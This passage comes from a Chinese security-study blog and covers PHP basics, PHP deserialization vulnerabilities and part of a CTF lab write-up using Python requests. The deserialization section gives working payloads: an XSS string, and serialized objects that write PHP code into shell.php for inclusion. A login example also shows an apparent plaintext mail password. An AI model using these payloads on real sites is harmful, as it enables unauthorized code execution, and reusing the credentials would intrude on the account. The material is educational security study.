array(1,2,3,4,5)foreach ($x as $y) {     //这里的y依次为1,2,3,4,5     }</code></pre><h2 id="2-isset理解："><a href="#2-isset理解：" class="headerlink" title="2.isset理解："></a>2.isset理解：</h2><pre><code>$q = isset($_POST[&#39;q&#39;])? $_POST[&#39;q&#39;] : &#39;&#39;;</code></pre><p>是否Form提交的内容中有名为q的值， 如果有则取q的值，否则$q赋值为空字符串。</p><h2 id="3-error-reporting-0"><a href="#3-error-reporting-0" class="headerlink" title="3.error_reporting(0);"></a>3.error_reporting(0);</h2><p>error_reporting(0);//关闭所有<em>php</em>错误报告</p><h2 id="4-include"><a href="#4-include" class="headerlink" title="4.include"></a>4.include</h2><p><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li><p>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</p></li><li><p>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</p></li><li><p><strong>假设我们有一个定义变量的包含文件（”vars.php”）：</strong></p></li><li><pre><code>&lt;?php$color=&#39;red&#39;;$car=&#39;BMW&#39;;?&gt;</code></pre><p><strong>这些变量可用在调用文件中：</strong></p><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;欢迎来到我的主页!&lt;/h1&gt;&lt;?php include &#39;vars.php&#39;;echo &quot;I have a $color $car&quot;; // I have a red BMW?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></li></ul><h2 id="5-序列化的开始php中serialize-与unserialize-函数使用方法"><a href="#5-序列化的开始php中serialize-与unserialize-函数使用方法" class="headerlink" title="5.序列化的开始php中serialize()与unserialize()函数使用方法"></a>5.序列化的开始<a href="https://so.csdn.net/search?q=php%E4%B8%ADunserialize" target="_blank" rel="noopener">php中serialize()与unserialize()函数使用方法</a></h2><p>序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p><p>理解：</p><p>意思可能就是将代码变成一种可以进行传输的一组数据流，就是一串简化后的字符串</p><p>实操：</p><pre><code>&lt;?phpclass person{    public $name=&#39;yyk&#39;;    public $sex=&#39;boy&#39;;    public $age=&#39;20&#39;;}$a=new person();$b=serialize($a);echo $b;?&gt;</code></pre><p>创建一个person类，在类中定义了三个属性，然后实例化了一个a，使用serializa将$a这个对象进行了序列化：</p><pre><code>O:6:&quot;person&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;yyk&quot;;s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;}</code></pre><p><strong>O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</strong></p><p><strong>6 代表类名字person占6个字符</strong></p><p><strong>person 类名</strong></p><p><strong>3 代表三个属性</strong></p><p><strong>s 代表字符串</strong></p><p><strong>4 代表属性名长度</strong></p><p><strong>name 属性名</strong></p><p><strong>s:3:”yyk” 字符串 属性值长度 属性值</strong></p><p>同时随着访问控制修饰符的改变，序列化后的属性长度和属性值也会不同：</p><ul><li>public(公有)</li><li>protected(受保护)</li><li>private(私有的)</li></ul><p>举例：</p><pre><code>&lt;?phpclass person{    public $name=&#39;yyk&#39;;    private $sex=&#39;boy&#39;;    protected $age=&#39;20&#39;;}$a=new person();$b=serialize($a);echo $b;?&gt;</code></pre><p>得到如下：</p><pre><code>O:6:&quot;person&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;yyk&quot;;s:11:&quot;personsex&quot;;s:3:&quot;boy&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;}</code></pre><p>protected属性被序列化后属性名长度会增加3，因为属性名会变成%00*%00属性名。</p><p>private属性被序列化后属性名会变成%00类名%00属性名。</p><h3 id="魔术方法-sleep"><a href="#魔术方法-sleep" class="headerlink" title="魔术方法 sleep()"></a>魔术方法 <strong>sleep()</strong></h3><p>serialize()函数在序列化对象的时候会检查类中是否存在魔术方法sleep()。如果存在，sleep()方法会先被调用，然后再执行序列化操作。<strong>sleep()方法可以确定那些属性被序列化。如果没有</strong>sleep()方法则默认序列化所有属性。</p><p>实操</p><pre><code>&lt;?phpclass person{    public $name=&#39;yyk&#39;;    private $sex=&#39;boy&#39;;    protected $age=&#39;20&#39;;    function __sleep(){        return array(&#39;sex&#39;,&#39;age&#39;);    }}$a=new person();$b=serialize($a);echo $b;?&gt;</code></pre><p>我在类中构造__sleep()函数，以实现$age，$sex被序列化，而$name没有被序列化</p><pre><code>O:6:&quot;person&quot;:2:{s:11:&quot;personsex&quot;;s:3:&quot;boy&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;}</code></pre><p>前引：</p><p><strong>unserialize()后会导致 <code>__wakeup()</code>或 <code>__destruct()</code>的直接调用，中间无需其他过程.</strong></p><p><strong>因此最理想的情况就是一些漏洞/危害代码在 <code>__wakeup()</code> 或 <code>__destruct()</code>中，从而当我们控制序列化字符串时可以去直接触发它们 .</strong></p><h3 id="魔术方法-destruct"><a href="#魔术方法-destruct" class="headerlink" title="魔术方法 __destruct()"></a>魔术方法 __destruct()</h3><p>脚本运行结束之前会调用对象的析构函数</p><pre><code>&lt;?phpclass person{    public $name=&#39;yyk&#39;;    private $sex=&#39;boy&#39;;    protected $age=&#39;20&#39;;    function __destruct(){        echo $this-&gt;name;    }}$id=$_GET[&#39;id&#39;];$b=unserialize($id);?&gt;</code></pre><p>构造url：</p><pre><code>O:6:&quot;person&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;yyk&quot;;s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;}</code></pre><p>会得到yyk</p><p> 漏洞利用：我们可以构建payload，将恶意代码插入序列化的字符串，然后将恶意代码转换成对象，调用__destruct()方法执行恶意代码。</p><p>payload:</p><pre><code>O:6:&quot;person&quot;:3:{s:4:&quot;name&quot;;s:25:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;}</code></pre><h3 id="魔术方法-wakeup"><a href="#魔术方法-wakeup" class="headerlink" title="魔术方法 __wakeup()"></a>魔术方法 __wakeup()</h3><p>unserialize()函数在序列化对象的时候会检查类中是否存在魔术方法wakeup()。如果存在，wakeup()方法会先被调用，然后再执行反序列化操作。可以再__wakeup()方法中对属性进行初始化或者改变。</p><p>比如：在进行反序列化的时候对属性进行重新赋值。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'yyk'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'20'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token string">'renew name'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说，在unserialize()函数发动之前，wakeup函数会提前觉醒，并且发动</p><p>源码分析：实例化一个对象，然后将它序列化后输出。再进行然序列化，调用了wakeup()函数，导致序列化后$name变成了renew name。</p><p>这些看起来似乎是没有什么危害，但是如果wakeup()函数处定义的代码不是重新赋值，而是漏洞代码危害就大了。</p><p>例如：</p><pre><code>&lt;?php class person{    public $name=&#39;zhangsan&#39;;    public $sex=&#39;boy&#39;;    public $age=&#39;18&#39;;    function __sleep(){        return array(&#39;name&#39;,&#39;sex&#39;,&#39;age&#39;);    }    function __wakeup(){        $fp=fopen(&quot;shell.php&quot;, &quot;w&quot;);        fwrite($fp, $this-&gt;name);        fclose($fp);    }}$zhangsan=new person();echo(serialize($zhangsan)).&quot;&lt;br&gt;&quot;;$id=$_GET[&#39;id&#39;];$un=unserialize($id);var_dump($un);require &quot;shell.php&quot;;?&gt;</code></pre><p><a href="https://www.runoob.com/php/func-filesystem-fopen.html" target="_blank" rel="noopener">PHP fopen() 函数</a>：打开一个文件或 URL。</p><p><a href="https://www.runoob.com/php/func-filesystem-fwrite.html" target="_blank" rel="noopener">PHP fwrite() 函数</a>：将内容写入一个打开的文件中。</p><p><a href="https://www.runoob.com/php/func-filesystem-fclose.html" target="_blank" rel="noopener">PHP fclose() 函数</a>：闭打开的文件。</p><p>这里的意思就是将shell.php以写的形式打开，然后写入到name的值当中，又因为是__wakeup函数，所以会在反序列化之前被执行出来</p><p>源码分析（使用方法）：unserialize()反序列化之后会调用wakeup()函数，将对象属性name的值写入shell.php文件当中，然后去包含它。</p><pre><code>?id=O:6:&quot;person&quot;:3:{s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;}</code></pre><h2 id="构造函数-construct"><a href="#构造函数-construct" class="headerlink" title="构造函数__construct()"></a>构造函数__construct()</h2><pre><code>&lt;?php class test{    function __construct($name){        $fp=fopen(&quot;shell.php&quot;, &quot;w&quot;);        fwrite($fp, $name);        fclose($fp);        echo &quot;123456上山大老鼠&quot;;    }}class person{    public $name=&#39;zhangsan&#39;;    public $sex=&#39;boy&#39;;    public $age=&#39;18&#39;;    function __sleep(){        return array(&#39;name&#39;,&#39;sex&#39;,&#39;age&#39;);    }    function __wakeup(){        $obj=new test($this-&gt;name);    }}$zhangsan=new person();echo(serialize($zhangsan)).&quot;&lt;br&gt;&quot;;$id=$_GET[&#39;id&#39;];$un=unserialize($id);var_dump($un);require &quot;shell.php&quot;;?&gt;</code></pre><p>得：</p><pre><code>O:6:&quot;person&quot;:3:{s:4:&quot;name&quot;;s:8:&quot;zhangsan&quot;;s:3:&quot;sex&quot;;s:3:&quot;boy&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;}</code></pre><p>改：</p><pre><code>O:6:&quot;person&quot;:1:{s:4:&quot;name&quot;;s:21:&quot;&lt;?php echo &quot;12346&quot;;?&gt;&quot;;}</code></pre><p>也就是说只要调用那么函数__wakeup函数中的name就可以激活反序列化</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/110290154?ops_request_misc=&request_id=&biz_id=102&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-110290154.first_rank_v2_pc_rank_v29" target="_blank" rel="noopener">待续</a></p><h2 id="反序列化本地实验："><a href="#反序列化本地实验：" class="headerlink" title="反序列化本地实验："></a>反序列化本地实验：</h2><pre><code>&lt;?php    class test{        public $a=&#39;hacked by ghtwf01&#39;;        public $b=&#39;hacked by blckder02&#39;;        public function pt(){            echo $this-&gt;a.&#39;&lt;br /&gt;&#39;;        }        public function __construct(){            echo &#39;__construct&lt;br /&gt;&#39;;        }        public function __destruct(){            echo &#39;__destruct()&lt;br /&gt;&#39;;        }        public function __sleep(){            echo &#39;__sleep&lt;br /&gt;&#39;;            return array(&#39;a&#39;,&#39;b&#39;);        }        public function __wakeup(){            echo &#39;__wakeup&lt;br /&gt;&#39;;        }    }    //创建对象调用__construct    $object = new test();    //序列化对象调用__sleep    $serialize = serialize($object);    //输出序列化后的字符串    echo &#39;serialize: &#39;.$serialize.&#39;&lt;br /&gt;&#39;;    //反序列化对象调用__wakeup    $unserialize=unserialize($serialize);    //调用pt输出数据    $unserialize-&gt;pt();    //脚本结束调用__destruct?&gt;</code></pre><p>结果：</p><pre><code>__construct__sleepserialize: O:4:&quot;test&quot;:2:{s:1:&quot;a&quot;;s:17:&quot;hacked by ghtwf01&quot;;s:1:&quot;b&quot;;s:19:&quot;hacked by blckder02&quot;;}__wakeuphacked by ghtwf01__destruct()__destruct()</code></pre><h2 id="6-preg-match-“-w-w-w-“-email-的理解"><a href="#6-preg-match-“-w-w-w-“-email-的理解" class="headerlink" title="6.preg_match(“/([\w-]+\@[\w-]+.[\w-]+)/“,$email)的理解"></a><a href="https://bbs.csdn.net/topics/220012055" target="_blank" rel="noopener">6.preg_match(“/([\w-]+\@[\w-]+.[\w-]+)/“,$email)</a>的理解</h2><h3 id="1-关于-："><a href="#1-关于-：" class="headerlink" title="1.关于\："></a>1.关于\：</h3><pre><code> \ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，&#39;n&#39; 匹配字符 &quot;n&quot;。&#39;\n&#39; 匹配一个换行符。序列 &#39;\\&#39; 匹配 &quot;\&quot; 而 &quot;\(&quot; 则匹配 &quot;(&quot;。 </code></pre><h3 id="2-关于-w："><a href="#2-关于-w：" class="headerlink" title="2.关于\w："></a>2.关于\w：</h3><pre><code> \w 匹配包括下划线的任何单词字符。等价于&#39;[A-Za-z0-9_]&#39;。 </code></pre><h3 id="3-构造正则表达式："><a href="#3-构造正则表达式：" class="headerlink" title="3.构造正则表达式："></a>3.构造正则表达式：</h3><p> 可以通过在一对分隔符之间放入表达式模式的各种组件来构造一个正则表达式，即/expression/ </p><p>而这里是</p><pre><code>/([\w\-]+\@[\w\-]+\.[\w\-]+)/</code></pre><h3 id="4-匹配先后顺序："><a href="#4-匹配先后顺序：" class="headerlink" title="4.匹配先后顺序："></a>4.匹配先后顺序：</h3><pre><code>各种操作符的运算优先级       相同优先级的从左到右进行运算，不同优先级的运算先高后低。各种操作符的优先级从高到低如下：   操作符 描述   \ 转义符   (), (?:), (?=), [] 圆括号和方括号   *, +, ?, {n}, {n,}, {n,m} 限定符   ^, $, \anymetacharacter 位置和顺序   | “或”操作 </code></pre><h3 id="5-理解："><a href="#5-理解：" class="headerlink" title="5.理解："></a><a href="https://blog.csdn.net/qianqian_0825/article/details/88558268?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161572421716780266231984%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161572421716780266231984&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-88558268.first_rank_v2_pc_rank_v29&utm_term=%2F%28%5B%5Cw%5C-%5D%2B%5C%40%5B%5Cw%5C-%5D%2B%5C.%5B%5Cw%5C-%5D%2B%29%2F" target="_blank" rel="noopener">5.理解：</a></h3><h4 id="1-w-w-w"><a href="#1-w-w-w" class="headerlink" title="1./([\w-]+\@[\w-]+.[\w-]+)/"></a>1./([\w-]+\@[\w-]+.[\w-]+)/</h4><pre><code>[\w\-]+</code></pre><p>这个是匹配了多个范围为所有的单词字符加上数字还有-的字符，，如 “aaa” “-ab” “c” “s._-l”</p><pre><code>\@[\w\-]+</code></pre><p>匹配到@后再匹配@后面的多个范围为：所有的字符+数字，-的字符</p><pre><code>\.[\w\-]+</code></pre><p>同上</p><h4 id="2-a-zA-Z"><a href="#2-a-zA-Z" class="headerlink" title="2./^[a-zA-Z ]*$/"></a>2./^[a-zA-Z ]*$/</h4><pre><code>/^$/ :完整表达式^ :表示以什么开始，或者取反$ :结束^[A-Za-z_] : 以字母开始，无论大小都可以；[^A-Za-z_] :非字母就可以；*    重复0次或更多次</code></pre><p>也就是对$name里面的东西，要求以字母的形式开头，连续匹配多次</p><h4 id="3-b-https-ftp-www-a-z0-9-amp-a-z0-9-amp-i"><a href="#3-b-https-ftp-www-a-z0-9-amp-a-z0-9-amp-i" class="headerlink" title="3./\b(?:(?:https?|ftp):\/\/|www.)[-a-z0-9+&amp;@#\/%?=_|!:,.;]*[-a-z0-9+&amp;@#\/%=_|]/i"></a>3./\b(?:(?:https?|ftp):\/\/|www.)[-a-z0-9+&amp;@#\/%?=<del>_|!:,.;]*[-a-z0-9+&amp;@#\/%=</del>_|]/i</h4><pre><code>\b 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在单词边界的前面：/ter\b/</code></pre><p><strong>(?:(?:https?|ftp):\/\/|www.)</strong></p><pre><code>(?:pattern)    匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 &quot;或&quot; 字符 (|) 来组合一个模式的各个部分是很有用。例如， &#39;industr(?:y|ies) 就是一个比 &#39;industry|industries&#39; 更简略的表达式。</code></pre><p>这里就是对后面的进行“或”的匹配形式，此处显示对https?与ftp进行查找，这个组后面跟着字符 : ，它会按字面进行匹配，找到以后对https://或者ftp://与www.进行选择，经过自行调试，发现</p><p><a href="https://www" target="_blank" rel="noopener">https://www</a>.</p><p><a href="ftp://www" target="_blank" rel="noopener">ftp://www</a>.</p><p>www.</p><p>这三个均可以</p><pre><code> * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 &quot;z&quot; 以及 &quot;zoo&quot;。* 等价于{0,}。 </code></pre><h2 id="7-rand-函数"><a href="#7-rand-函数" class="headerlink" title="7.rand()函数"></a>7.rand()函数</h2><p>rand(1,10):从1-10之中随机取一个数字</p><h2 id="8-strpos-函数"><a href="#8-strpos-函数" class="headerlink" title="8.strpos() 函数"></a>8.strpos() 函数</h2><p><a href="https://www.runoob.com/php/func-string-strpos.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-string-strpos.html</a></p><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p><h2 id="9-file-get-contents-函数"><a href="#9-file-get-contents-函数" class="headerlink" title="9.file_get_contents() 函数"></a>9.<a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html" target="_blank" rel="noopener">file_get_contents() 函数</a></h2><pre><code>&lt;?phpecho file_get_contents(&quot;test.txt&quot;);?&gt;</code></pre><p>上面的代码将输出：</p><p>This is a test file with test text.</p><p>也就是说可以利用这个函数来读一个文件中的文本</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全lab</title>
      <link href="/2021/02/10/wang-luo-an-quan-lab/"/>
      <url>/2021/02/10/wang-luo-an-quan-lab/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h1><h2 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a>key又又找不到了</h2><p>分值: 200</p><p>小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！</p><p>右键查看源代码</p><pre><code>&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href=&quot;./search_key.php&quot;&gt;_到这里找key__&lt;/a&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>编写脚本：</p><pre><code>import requestsurl = &quot;http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php&quot;res = requests.get(url)print(res.text)</code></pre><p>这就好像模拟了抓包的一个过程</p><p>得到：key is : yougotit_script_now</p><h2 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a>快速口算</h2><p>分值: 350</p><p>小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？</p><p>恶补基础↓：</p><h3 id="1-Requests模块的简单使用"><a href="#1-Requests模块的简单使用" class="headerlink" title="1.Requests模块的简单使用"></a><strong>1.Requests模块的简单使用</strong></h3><pre><code>#HTTP请求类型#无参数的get类型r = requests.get(&#39;http://httpbin.org/get&#39;)#有参的get类型payload = {&#39;key1&#39;:&#39;vaule1&#39;,&#39;key2&#39;:&#39;value2&#39;}r = requests.get(url,params=payload)#无参的post类型r = requests.post(&quot;http://httpbin.org/post&quot;)#有参的post类型r = requests.post(url,data=payload)#data不光可以接受字典类型的数据，还可以接受json等格式import jsonpayload = {&#39;a&#39;:&#39;杨&#39;,&#39;b&#39;:&#39;hello&#39;}r = requests.post(&#39;http://httpbin.org/post&#39;, data=json.dumps(payload))#发送文件的post类型，这个相当于向网站上传一张图片，文档等操作，这时要使用files参数files = {&#39;file&#39;: open(&#39;touxiang.png&#39;, &#39;rb&#39;)}r = requests.post(&#39;http://httpbin.org/post&#39;, files=files)#put类型r = requests.put(&quot;http://m.ctrip.com/put&quot;)#delete类型r = requests.delete(&quot;http://m.ctrip.com/delete&quot;)#head类型r = requests.head(&quot;http://m.ctrip.com/head&quot;)#options类型r = requests.options(&quot;http://m.ctrip.com/get&quot;)#获取响应内容print r.content #以字节的方式去显示，中文显示为字符print r.text #以文本的方式去显示#URL传递参数payload = {&#39;keyword&#39;: &#39;日本&#39;, &#39;salecityid&#39;: &#39;2&#39;}r = requests.get(&quot;http://m.ctrip.com/webapp/tourvisa/visa_list&quot;, params=payload)print r.url #示例为http://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=日本#获取/修改网页编码r = requests.get(&#39;https://github.com/timeline.json&#39;)print r.encodingr.encoding = &#39;utf-8&#39;#json处理r = requests.get(&#39;https://github.com/timeline.json&#39;)print r.json() #需要先import json#定制请求头url = &#39;http://m.ctrip.com&#39;headers = {&#39;User-Agent&#39; : &#39;Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19&#39;}r = requests.post(url, headers=headers)print r.request.headers#复杂post请求url = &#39;http://m.ctrip.com&#39;payload = {&#39;some&#39;: &#39;data&#39;}r = requests.post(url, data=json.dumps(payload)) #如果传递的payload是string而不是dict，需要先调用dumps方法格式化一下#post多部分编码文件url = &#39;http://m.ctrip.com&#39;files = {&#39;file&#39;: open(&#39;report.xls&#39;, &#39;rb&#39;)}r = requests.post(url, files=files)#响应状态码r = requests.get(&#39;http://m.ctrip.com&#39;)print r.status_code#响应头r = requests.get(&#39;http://m.ctrip.com&#39;)print r.headersprint r.headers[&#39;Content-Type&#39;]print r.headers.get(&#39;content-type&#39;) #访问响应头部分内容的两种方式#Cookiesr = requests.get(&#39;http://www.baidu.com&#39;)r.cookies[&#39;BAIDUID&#39;]  #读取cookiesurl = &#39;http://m.ctrip.com/cookies&#39;cookies = dict(cookies_are=&#39;working&#39;)r = requests.get(url, cookies=cookies) #发送cookies#设置超时时间r = requests.get(&#39;http://m.ctrip.com&#39;, timeout=0.001)#访问中使用sessions = requests.Session() #先初始化一个session对象r = s.post(url,data = user) #然后使用这个session对象来进行访问，将requests中的session类实例化为一个对象。以便于在请求头中自动加上session id。#设置访问代理proxies = {           &quot;http&quot;: &quot;http://10.10.10.10:8888&quot;,           &quot;https&quot;: &quot;http://10.10.10.100:4444&quot;,          }r = requests.get(&#39;http://m.ctrip.com&#39;, proxies=proxies)</code></pre><h3 id="2-json请求"><a href="#2-json请求" class="headerlink" title="2.json请求"></a>2.json请求</h3><pre><code>#!/user/bin/env python#coding=utf-8import requestsimport jsonclass url_request():    def __init__(self):            &quot;&quot;&quot; init &quot;&quot;&quot;if __name__==&#39;__main__&#39;:    headers = {&#39;Content-Type&#39; : &#39;application/json&#39;}    payload = {&#39;CountryName&#39;:&#39;中国&#39;,               &#39;ProvinceName&#39;:&#39;陕西省&#39;,               &#39;L1CityName&#39;:&#39;汉中&#39;,               &#39;L2CityName&#39;:&#39;城固&#39;,               &#39;TownName&#39;:&#39;&#39;,               &#39;Longitude&#39;:&#39;107.33393&#39;,               &#39;Latitude&#39;:&#39;33.157131&#39;,               &#39;Language&#39;:&#39;CN&#39;               }    r = requests.post(&quot;http://www.xxxxxx.com/CityLocation/json/LBSLocateCity&quot;,headers=headers,data=payload)    #r.encoding = &#39;utf-8&#39;    data=r.json()    if r.status_code!=200:        print &quot;LBSLocateCity API Error &quot; + str(r.status_code)    print data[&#39;CityEntities&#39;][0][&#39;CityID&#39;] #打印返回json中的某个key的value    print data[&#39;ResponseStatus&#39;][&#39;Ack&#39;]    print json.dumps(data,indent=4,sort_keys=True,ensure_ascii=False) #树形打印json，ensure_ascii必须设为False否则中文会显示为unicode</code></pre><h3 id="3-xml请求"><a href="#3-xml请求" class="headerlink" title="3.xml请求"></a>3.xml请求</h3><pre><code>#!/user/bin/env python#coding=utf-8import requestsclass url_request():    def __init__(self):            &quot;&quot;&quot; init &quot;&quot;&quot;if __name__==&#39;__main__&#39;:    headers = {&#39;Content-type&#39;: &#39;text/xml&#39;}    XML = &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Request xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;jme&gt;&lt;JobClassFullName&gt;WeChatJSTicket.JobWS.Job.JobRefreshTicket,WeChatJSTicket.JobWS&lt;/JobClassFullName&gt;&lt;Action&gt;RUN&lt;/Action&gt;&lt;Param&gt;1&lt;/Param&gt;&lt;HostIP&gt;127.0.0.1&lt;/HostIP&gt;&lt;JobInfo&gt;1&lt;/JobInfo&gt;&lt;NeedParallel&gt;false&lt;/NeedParallel&gt;&lt;/jme&gt;&lt;/Request&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#39;    url = &#39;http://jobws.push.mobile.xxxxxxxx.com/RefreshWeiXInTokenJob/RefreshService.asmx&#39;    r = requests.post(url,headers=headers,data=XML)    #r.encoding = &#39;utf-8&#39;    data = r.text    print data</code></pre><h3 id="5-Requests模拟登入实例"><a href="#5-Requests模拟登入实例" class="headerlink" title="5.Requests模拟登入实例"></a>5.Requests模拟登入实例</h3><pre><code>import requestspayload = {&#39;action:login&#39;:&#39;&#39;,&#39;uid&#39;:&#39;08133248&#39;,&#39;domain&#39;:&#39;cumt.edu.cn&#39;,&#39;nodetect&#39;:&#39;false&#39;,&#39;password&#39;:&#39;wattcswh&#39;,&#39;locale&#39;:&#39;zh_CN&#39;}header = {&quot;Host&quot;: &quot;mail.cumt.edu.cn&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;,&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,&quot;Referer&quot;: &quot;http://acm.hdu.edu.cn/&quot;,&quot;Cookie&quot;: &quot;uid=08133248&quot;,&quot;Connection&quot;: &quot;keep-alive&quot;}s = requests.Session()r = s.post(&#39;http://mail.cumt.edu.cn/coremail/index.jsp&#39;,data=payload,headers=header)print r.status_code</code></pre><p>cookie的信息需要先通过抓包来获取</p><p>脚本分析：</p><pre><code># -*- coding : utf-8 -*-import requestsimport re   #正则表达式url = &#39;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&#39;head = {&#39;Cookie&#39;: &#39;PHPSESSID=98db957833ad06f20d20765aed472328&#39;}source = requests.get(url, headers=head).content.decode(&#39;utf-8&#39;)expression = 